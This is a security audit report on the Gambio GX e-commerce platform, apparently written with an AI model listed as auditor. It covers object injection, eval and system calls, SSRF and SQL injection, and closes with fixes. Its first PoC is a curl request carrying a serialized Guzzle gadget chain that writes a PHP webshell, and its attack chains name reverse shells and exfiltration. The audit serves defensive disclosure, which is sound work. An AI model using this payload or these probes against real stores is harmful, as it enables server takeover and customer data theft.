# Security Audit Report: SQL Injection, RCE, and Object Injection
## Gambio GX eCommerce Platform - Unauthenticated Entrypoints Focus

**Date:** 2025-12-24  
**Auditor:** GitHub Copilot  
**Scope:** SQL Injection, Remote Code Execution (RCE), and Object Injection vulnerabilities in unauthenticated HTTP entrypoints  

---

## EXECUTIVE SUMMARY

This audit focuses specifically on three critical vulnerability classes that can be exploited **without admin authorization**:
- **SQL Injection (SQLi)**
- **Remote Code Execution (RCE)**
- **Object Injection (ObjInj)**

---

## PHASE 1 — VULNERABILITY CLASS ANALYSIS

### Object Injection Vulnerabilities

#### CRITICAL: `magnaCallback.php` - Unauthenticated Object Injection

**File:** `magnaCallback.php`  
**Lines:** 859-867  
**Auth Required:** Passphrase only (no admin session)  
**Severity:** Critical  

**Code:**
```php
if ((MAGNA_CALLBACK_MODE == 'STANDALONE') &&
    array_key_exists('passphrase', $_POST) &&
    ($_POST['passphrase'] == getDBConfigValue('general.passphrase', 0)) &&
    array_key_exists('function', $_POST)
) {
    $arguments = array_key_exists('arguments', $_POST) ? unserialize($_POST['arguments']) : array();
    $arguments = is_array($arguments) ? $arguments : array();

    $includes = array_key_exists('includes', $_POST) ? unserialize($_POST['includes']) : array();
    $includes = is_array($includes) ? $includes : array();

    echo magnaEncodeResult(magnaExecute($_POST['function'], $arguments, $includes));
}
```

**Analysis:**
- Uses `unserialize()` on `$_POST['arguments']` and `$_POST['includes']`
- No `allowed_classes` parameter to restrict deserialization
- Only protected by passphrase comparison (not admin session)
- Passphrase stored in database, potentially leakable via SQLi or other vulnerabilities

**Attack Vector:**
1. Obtain Magnalister passphrase (bruteforce, SQLi, config leak)
2. Submit malicious serialized payload
3. Trigger arbitrary PHP gadget chains

**PoC:**
```bash
curl -X POST https://<TARGET>/magnaCallback.php \
  -d "passphrase=<PASSPHRASE>" \
  -d "function=test" \
  -d "arguments=O:29:\"GuzzleHttp\\Cookie\\FileCookieJar\":3:{s:41:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0filename\";s:15:\"/tmp/shell.php\";s:52:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\";b:1;s:36:\"\0GuzzleHttp\\Cookie\\CookieJar\0cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:33:\"\0GuzzleHttp\\Cookie\\SetCookie\0data\";a:3:{s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:29:\"<?php system(\$_GET['c']); ?>\";}}}}\"" \
  -d "includes="
```

**Impact:** Remote Code Execution via PHP gadget chains

---

#### MEDIUM: `gambio_updater/classes/GambioUpdateSerializer.inc.php` - Serialization Handler

**File:** `gambio_updater/classes/GambioUpdateSerializer.inc.php`  
**Auth Required:** Updater access  
**Severity:** Medium (requires prior access)  

The GambioUpdateSerializer uses serialize/unserialize for update arrays. While protected by updater authentication, improper handling could lead to object injection.

---

### Remote Code Execution (RCE) Vulnerabilities

#### HIGH: `gambio_updater/classes/zip_creator/pclzip.lib.php` - Eval in Callback

**File:** `gambio_updater/classes/zip_creator/pclzip.lib.php`  
**Lines:** 2817, 3030, 4068, 4342, 4392  
**Auth Required:** Updater context  
**Severity:** High  

**Code:**
```php
eval('$v_result = '.$p_options[PCLZIP_CB_PRE_ADD].'(PCLZIP_CB_PRE_ADD, $v_local_header);');
eval('$v_result = '.$p_options[PCLZIP_CB_POST_ADD].'(PCLZIP_CB_POST_ADD, $v_local_header);');
eval('$v_result = '.$p_options[PCLZIP_CB_PRE_EXTRACT].'(PCLZIP_CB_PRE_EXTRACT, $v_local_header);');
eval('$v_result = '.$p_options[PCLZIP_CB_POST_EXTRACT].'(PCLZIP_CB_POST_EXTRACT, $v_local_header);');
```

**Analysis:**
- Uses `eval()` to execute callback functions
- If callback names can be controlled, arbitrary code execution is possible
- Protected by updater authentication context

---

#### MEDIUM: `gambio_updater/classes/CLIHelper.inc.php` - System Command Execution

**File:** `gambio_updater/classes/CLIHelper.inc.php`  
**Line:** 51  
**Auth Required:** CLI context  
**Severity:** Medium  

**Code:**
```php
system($string);
```

**Analysis:**
- Direct `system()` call for CLI operations
- Requires CLI access, not directly HTTP-accessible

---

#### MEDIUM: Dynamic Class Loading in `request_port.php`

**File:** `request_port.php`  
**Lines:** 56-70  
**Auth Required:** None (public endpoint)  
**Severity:** Medium  

**Code:**
```php
$f_module_name = $_GET['module'];

if(trim($f_module_name) != '') {
    $t_class_name_suffix = 'AjaxHandler';
    $coo_request_router = MainFactory::create_object('RequestRouter', array($t_class_name_suffix));
    $coo_request_router->set_data('GET', $_GET);
    $coo_request_router->set_data('POST', $_POST);
    $t_proceed_status = $coo_request_router->proceed($f_module_name);
}
```

**Analysis:**
- User controls module name
- Dynamically loads `{module}AjaxHandler` class
- If attacker can create a file named `*AjaxHandler`, arbitrary code execution is possible

---

### SQL Injection Vulnerabilities

#### MEDIUM: `callback/sofort/ressources/scripts/sofortOrders.php` - SQL Injection

**File:** `callback/sofort/ressources/scripts/sofortOrders.php`  
**Lines:** 172, 175, 188, 213, 222, 352, 801  
**Auth Required:** Admin Session (but weak validation)  
**Severity:** Medium  

**Code Examples:**
```php
$query_product = shopDbQuery('SELECT products_quantity, products_price, products_model, products_tax, products_name FROM '.TABLE_ORDERS_PRODUCTS.' WHERE orders_products_id = "'.HelperFunctions::escapeSql($_POST['opid_product'][$i]).'"');

$query_attributes = shopDbQuery("SELECT products_options, products_options_values, options_values_price, price_prefix FROM ".TABLE_ORDERS_PRODUCTS_ATTRIBUTES." WHERE orders_id = '".shopDbInput($_GET['oID'])."' AND orders_products_id = '".HelperFunctions::escapeSql($_POST['opid_product'][$i])."'");
```

**Analysis:**
- Uses `HelperFunctions::escapeSql()` and `shopDbInput()` for escaping
- Dependent on proper implementation of these escape functions
- Array index `$_POST['opid_product'][$i]` may bypass escaping

---

#### LOW: `gambio_installer/request_port.php` - SQL with Integer Casting

**File:** `gambio_installer/request_port.php`  
**Lines:** 256, 263  
**Auth Required:** Installer mode only  
**Severity:** Low (protected by integer casting)  

**Code:**
```php
$check_query = xtc_db_query("select count(*) as total from " . TABLE_ZONES . " where zone_country_id = '" . (int)$_POST['COUNTRY'] . "'");
$zones_query = xtc_db_query("select zone_name from " . TABLE_ZONES . " where zone_country_id = '" . (int)$_POST['COUNTRY'] . "' order by zone_name");
```

**Analysis:**
- Integer casting `(int)` prevents SQL injection
- Only accessible during installation mode

---

#### LOW: `product_info.php` - SQL with Integer Casting

**File:** `product_info.php`  
**Line:** 40  
**Auth Required:** None (public)  
**Severity:** Low (properly sanitized)  

**Code:**
```php
$cat = xtc_db_query("SELECT categories_id FROM " . TABLE_PRODUCTS_TO_CATEGORIES . " WHERE products_id = '" . (int)$_GET['products_id'] . "'");
```

**Analysis:**
- Proper integer casting prevents SQL injection

---

## PHASE 2 — UNAUTHENTICATED ENTRYPOINTS SUMMARY

### High-Risk Unauthenticated Endpoints

| Endpoint | Vulnerability | Exploitability |
|----------|---------------|----------------|
| `magnaCallback.php` | Object Injection | **Requires passphrase** |
| `request_port.php` | Dynamic Class Loading | **Direct HTTP access** |
| `autocomplete.php` | SSRF (forwarding requests) | **Direct HTTP access** |
| `ec_proxy.php` | SSRF | **Direct HTTP access** |

### Protected by Authentication

| Endpoint | Vulnerability | Protection |
|----------|---------------|------------|
| `sofortOrders.php` | SQL Injection | Admin session |
| `gambio_updater/*` | RCE via eval | Updater auth |
| `gambio_installer/*` | SQL Injection | Install mode only |

---

## PHASE 3 — ATTACK CHAINS

### Chain 1: Passphrase Bruteforce → Object Injection → RCE

```
1. Bruteforce Magnalister passphrase
   └── Default/weak passphrase
   └── Dictionary attack
   └── Config file disclosure
   
2. Submit malicious serialized payload
   └── PHP gadget chain (Guzzle, Monolog, etc.)
   
3. Achieve Remote Code Execution
   └── Write webshell
   └── Reverse shell
   └── Data exfiltration
```

### Chain 2: SSRF → Internal Access → Privilege Escalation

```
1. Exploit SSRF in ec_proxy.php or autocomplete.php
   └── Access internal services
   └── Cloud metadata endpoints
   
2. Extract credentials
   └── Database credentials
   └── API keys
   └── Magnalister passphrase
   
3. Escalate to Object Injection or SQL Injection
```

### Chain 3: SQL Injection → Data Extraction → Object Injection

```
1. Find SQL injection in authenticated endpoint
   └── Weak escaping implementation
   └── Second-order injection
   
2. Extract Magnalister passphrase from database
   └── general.passphrase value
   
3. Execute Object Injection attack
   └── Full RCE capability
```

---

## PHASE 4 — PROOF OF CONCEPT EXAMPLES

### PoC 1: Object Injection Detection

```bash
# Test for deserialization handling
curl -X POST https://<TARGET>/magnaCallback.php \
  -d "passphrase=test" \
  -d "function=phpinfo" \
  -d "arguments=a:0:{}" \
  -d "includes=a:0:{}"

# Response analysis:
# - "magnalister not activated" = passphrase wrong or magnalister not installed
# - Error/crash = potential deserialization issue
# - Successful output = valid passphrase
```

### PoC 2: Dynamic Class Loading Probe

```bash
# Enumerate available modules
curl "https://<TARGET>/request_port.php?module=nonexistent"

# Response analysis:
# - Error message may reveal class loading mechanism
# - Check for file inclusion errors
```

### PoC 3: SSRF via Autocomplete

```bash
# Test SSRF capability
curl "https://<TARGET>/autocomplete.php?query=test&redirect=http://internal-server/"

# The autocomplete.php forwards requests to Findologic service
# with user-controlled parameters appended
```

---

## PHASE 5 — FINDINGS SUMMARY

### Critical Findings (No Admin Auth Required)

| ID | Vulnerability | File | Impact | Exploitability |
|----|---------------|------|--------|----------------|
| **OBJ-001** | Object Injection | magnaCallback.php | RCE | Requires passphrase |
| **RCE-001** | Dynamic Class Load | request_port.php | RCE | Medium (needs gadget) |

### High Findings (Elevated Access)

| ID | Vulnerability | File | Impact | Exploitability |
|----|---------------|------|--------|----------------|
| **RCE-002** | eval() in ZIP handler | pclzip.lib.php | RCE | Updater context |
| **SSRF-001** | Server-Side Request Forgery | autocomplete.php | Internal access | Direct HTTP |

### Medium Findings

| ID | Vulnerability | File | Impact | Exploitability |
|----|---------------|------|--------|----------------|
| **SQL-001** | SQL Injection | sofortOrders.php | Data theft | Admin session |
| **RCE-003** | system() call | CLIHelper.inc.php | RCE | CLI context |

---

## RECOMMENDATIONS

### Immediate Actions

1. **magnaCallback.php:** 
   - Replace `unserialize()` with `json_decode()`
   - If serialization required, use `unserialize($data, ['allowed_classes' => false])`
   - Implement additional authentication layer (IP whitelist, HMAC)

2. **request_port.php:**
   - Implement strict allowlist for module names
   - Add rate limiting to prevent enumeration

3. **pclzip.lib.php:**
   - Remove or disable callback functionality using `eval()`
   - Use direct function calls instead of dynamic evaluation

### Long-term Improvements

1. **Parameterized Queries:** Replace all string concatenation in SQL queries with prepared statements
2. **Input Validation:** Implement comprehensive input validation framework
3. **Serialization Policy:** Audit and eliminate all `unserialize()` calls with user-controlled input
4. **Security Headers:** Implement CSP, X-Frame-Options, and other security headers

---

## APPENDIX: Affected Files

### Object Injection
- `magnaCallback.php` (Lines 859, 862)
- `gambio_updater/classes/GambioUpdateControl.inc.php`
- `gambio_updater/classes/GambioUpdateSerializer.inc.php`

### Remote Code Execution
- `gambio_updater/classes/zip_creator/pclzip.lib.php` (Lines 2817, 3030, 4068, 4342, 4392)
- `gambio_updater/classes/CLIHelper.inc.php` (Line 51)
- `request_port.php` (Lines 56-70)

### SQL Injection Points
- `callback/sofort/ressources/scripts/sofortOrders.php` (Lines 172, 175, 188, 213, 222, 352, 801)
- `gambio_installer/request_port.php` (Lines 256, 263)
- `product_info.php` (Line 40)

---

*This report is for authorized security testing purposes only.*
